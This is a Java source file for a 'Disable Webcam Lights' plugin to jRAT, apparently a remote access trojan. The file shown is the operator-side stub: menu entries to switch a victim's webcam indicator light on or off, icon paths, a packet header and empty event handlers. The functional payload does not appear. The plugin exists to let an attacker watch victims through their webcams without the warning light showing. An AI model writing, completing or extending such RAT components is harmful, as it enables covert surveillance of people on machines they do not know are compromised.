package jrat.plugin.dwl.client;

import iconlib.IconUtils;

import java.awt.event.ActionListener;
import java.io.File;
import java.util.List;

import javax.swing.ImageIcon;

import jrat.api.RATPlugin;
import jrat.api.events.OnConnectEvent;
import jrat.api.events.OnDisableEvent;
import jrat.api.events.OnDisconnectEvent;
import jrat.api.events.OnEnableEvent;
import jrat.api.events.OnPacketEvent;
import jrat.api.events.OnSendPacketEvent;
import jrat.api.ui.RATControlMenuEntry;
import jrat.api.ui.RATMenuItem;

public class DWLPlugin extends RATPlugin {

	public static final String ICON_LOCATION = System.getProperty("jrat.dir").replace("\\", "/") + File.separator + "files/plugins/DisableWebcamLights/icon.png";
	public static final String ICON_DISABLE_LOCATION = System.getProperty("jrat.dir").replace("\\", "/") + File.separator + "files/plugins/DisableWebcamLights/icon_minus.png";
	public static final String ICON_ENABLE_LOCATION = System.getProperty("jrat.dir").replace("\\", "/") + File.separator + "files/plugins/DisableWebcamLights/icon_plus.png";
	
	public static final byte HEADER = 110;

	public static RATControlMenuEntry entry;
	public static boolean enabled;
	
	public DWLPlugin() {
		super("Disable Webcam Lights", "1.0", "Disables some webcam lights, requires admin permissions", "Anonmoosekaab");
		
		RATMenuItem entry = new RATMenuItem(new MenuListener(true), "Enable Webcam Lights", IconUtils.getIcon("icon-plus", DWLPlugin.class));
		RATMenuItem.addItem(entry);

		entry = new RATMenuItem(new MenuListener(false), "Disable Webcam Lights", IconUtils.getIcon("icon-minus", DWLPlugin.class));
		RATMenuItem.addItem(entry);
	}
	
	public void onEnable(OnEnableEvent event) throws Exception {
		
	}

	public void onDisable(OnDisableEvent event) throws Exception {
		
	}

	public void onPacket(OnPacketEvent event) throws Exception {
		
	}
	
	// Server connected to us
	public void onConnect(OnConnectEvent event) throws Exception {

	}

	// Server disconnected from us
	public void onDisconnect(OnDisconnectEvent event) throws Exception {

	}

	public List<RATControlMenuEntry> getControlTreeItems() throws Exception {
		return null;
	}

	public void onSendPacket(OnSendPacketEvent event) throws Exception {

	}

	@Override
	public ActionListener getGlobalActionListener() {
		return null;
	}

}
